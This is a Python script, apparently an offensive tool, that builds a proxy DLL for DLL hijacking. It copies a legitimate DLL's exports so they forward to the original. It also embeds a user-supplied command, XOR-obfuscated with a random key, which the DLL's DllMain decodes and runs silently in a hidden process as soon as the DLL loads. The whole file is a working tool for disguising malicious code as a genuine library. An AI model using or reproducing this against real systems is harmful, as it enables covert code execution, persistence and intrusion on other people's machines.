import pefile
import sys
import os
import random
import subprocess

def detect_arch(pe):
    try:
        magic = pe.OPTIONAL_HEADER.Magic
        if magic == 0x20b:
            return "x64"
        elif magic == 0x10b:
            return "x86"
    except Exception:
        pass
    return "unknown"

def write_def(def_path, libname, source_basename, exports):
    with open(def_path, "w", newline="\n") as f:
        f.write(f"LIBRARY {libname}\nEXPORTS\n")
        for name in exports:
            f.write(f"{name}={source_basename}.{name}\n")

def xor_encode(s, key):
    return bytes([b ^ key for b in s.encode()])

def write_stub_c(c_path, command):
    # Generate a random key between 1 and 255
    key = random.randint(1, 255)
    encoded = xor_encode(command, key)

    # Convert encoded bytes to comma-separated hex for C
    hex_bytes = ','.join(f'0x{b:02x}' for b in encoded)
    length = len(encoded)

    with open(c_path, "w", newline="\n") as f:
        f.write('#include <windows.h>\n\n')
        f.write(f'unsigned char command[{length}] = {{ {hex_bytes} }};\n')
        f.write(f'int key = {key};\n\n')
        f.write('void decode(unsigned char* buf, int len, int key) {\n')
        f.write('    for (int i = 0; i < len; i++) buf[i] ^= key;\n')
        f.write('}\n\n')
        f.write('DWORD WINAPI LaunchProc(LPVOID lpParam) {\n')
        f.write('    decode(command, sizeof(command), key);\n')
        f.write('    STARTUPINFOA si = { sizeof(si) };\n')
        f.write('    PROCESS_INFORMATION pi;\n')
        f.write('    CreateProcessA(NULL, (char*)command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, "C:\\", &si, &pi);\n')
        f.write('    return 0;\n')
        f.write('}\n\n')
        f.write('BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {\n')
        f.write('    if (reason == DLL_PROCESS_ATTACH) {\n')
        f.write('        CreateThread(NULL, 0, LaunchProc, NULL, 0, NULL);\n')
        f.write('    }\n')
        f.write('    return TRUE;\n')
        f.write('}\n')

def main():
    if len(sys.argv) != 4:
        script_name = os.path.basename(sys.argv[0])
        print(f"Usage: {script_name} <source.dll> <output.dll> <command>")
        sys.exit(1)

    source_dll = sys.argv[1]
    output_dll = sys.argv[2]
    command = sys.argv[3]

    if not os.path.exists(source_dll):
        print(f"Source DLL not found: {source_dll}")
        sys.exit(1)

    try:
        pe = pefile.PE(source_dll)
    except Exception as e:
        print(f"Failed to parse source DLL: {e}")
        sys.exit(1)

    arch = detect_arch(pe)
    if arch == "x64":
        gcc = "x86_64-w64-mingw32-gcc"
    elif arch == "x86":
        gcc = "i686-w64-mingw32-gcc"
    print(f"Detected source DLL architecture: {arch}")

    exports = []
    if hasattr(pe, "DIRECTORY_ENTRY_EXPORT"):
        for sym in pe.DIRECTORY_ENTRY_EXPORT.symbols:
            if sym.name:
                try:
                    exports.append(sym.name.decode("utf-8", errors="ignore"))

                except Exception:
                    # fallback: convert bytes to str via latin-1 to preserve bytes
                    exports.append(str(sym.name))
    pe.close()

    if not exports:
        print("No named exports found in the source DLL.")
        sys.exit(1)

    libname = os.path.basename(output_dll)
    source_basename = os.path.basename(source_dll)
    def_path = "exports.def"
    c_path = "stub.c"

    try:
        write_def(def_path, libname, source_basename, exports)
        write_stub_c(c_path, command)
        
        gcc_cmd = [
            gcc,
            "-shared",
            "-s",
            c_path,
            def_path,
            "-o",
            output_dll
        ]

        print("Running GCC:", " ".join(gcc_cmd))
        subprocess.check_call(gcc_cmd)
        print(f"Proxy DLL created: {output_dll}")

    except FileNotFoundError:
        arch_name = "w64" if arch == "x64" else "w32"
        print(f"GCC not found. Ensure MinGW-{arch_name} GCC is installed and in PATH.")
        sys.exit(1)
    except subprocess.CalledProcessError as e:
        print("GCC failed with return code", e.returncode)
        sys.exit(1)
    finally:
        # cleanup temporary files
        for p in (def_path, c_path):
            try:
                if os.path.exists(p):
                    os.remove(p)
            except Exception:
                pass

if __name__ == "__main__":
    main()

